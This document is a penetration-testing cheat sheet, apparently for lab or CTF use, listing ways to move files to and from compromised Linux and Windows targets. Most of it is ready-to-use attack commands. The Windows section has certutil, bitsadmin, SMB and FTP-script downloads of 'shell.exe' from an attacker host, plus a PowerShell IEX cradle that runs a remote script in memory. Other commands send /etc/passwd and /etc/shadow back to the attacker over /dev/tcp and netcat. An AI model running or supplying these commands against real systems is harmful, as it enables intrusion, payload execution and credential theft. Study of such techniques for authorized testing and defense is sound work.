# File Transfers

Every method for moving files to and from targets.

---

## LINUX TARGET

### Python HTTP server + wget/curl

Most common method — Works on almost every Linux target

```bash
# On attacker:
python3 -m http.server 80

# On target:
wget http://$LHOST/file -O /tmp/file
curl http://$LHOST/file -o /tmp/file
```

---

### Netcat file transfer

No HTTP needed — Direct TCP transfer

```bash
# On attacker (send):
nc -lvnp 4444 < file.txt
# On target (receive):
nc $LHOST 4444 > file.txt
```

---

### SCP (via SSH)

Encrypted transfer — If you have SSH credentials

```bash
scp file.txt user@$IP:/tmp/file.txt
scp user@$IP:/etc/passwd ./passwd
```

---

### Base64 encode/decode

No network transfer needed — Copy/paste through shell

```bash
# On attacker:
base64 -w 0 file.bin
# On target:
echo "BASE64STRING" | base64 -d > file.bin
```

---

### /dev/tcp (bash only)

No tools needed — Bash built-in

```bash
# Attacker: nc -lvnp 4444 > file.txt
# Target:
cat /etc/passwd > /dev/tcp/$LHOST/4444
```

---

## WINDOWS TARGET

### certutil

Built into Windows — Download files via HTTP

```bash
certutil -urlcache -f http://$LHOST/shell.exe C:\Windows\Temp\shell.exe
```

---

### PowerShell download cradles

Multiple methods — Try each if one is blocked

```powershell
# DownloadFile (saves to disk):
(New-Object Net.WebClient).DownloadFile('http://$LHOST/shell.exe','C:\Windows\Temp\shell.exe')

# DownloadString (in-memory execution):
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')

# Invoke-WebRequest (PowerShell 3+):
Invoke-WebRequest -Uri http://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe
```

---

### SMB share

Serve files via SMB — Often works when HTTP is blocked

```bash
# On attacker:
impacket-smbserver share $(pwd) -smb2support
# On target:
copy \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe
```

---

### Bitsadmin

Built-in Windows tool — Alternative to certutil

```bash
bitsadmin /transfer job /download /priority high http://$LHOST/shell.exe C:\Windows\Temp\shell.exe
```

---

### Windows FTP (non-interactive)

Script FTP commands — Bypass interactive prompt

```bash
echo open $LHOST> ftp.txt
echo USER anonymous>> ftp.txt
echo binary>> ftp.txt
echo GET shell.exe>> ftp.txt
echo bye>> ftp.txt
ftp -s:ftp.txt
```

---

## EXFILTRATION

### Netcat exfil

Send files back to attacker — Simple TCP

```bash
# Attacker: nc -lvnp 4444 > loot.txt
# Target: nc $LHOST 4444 < /etc/shadow
```

---
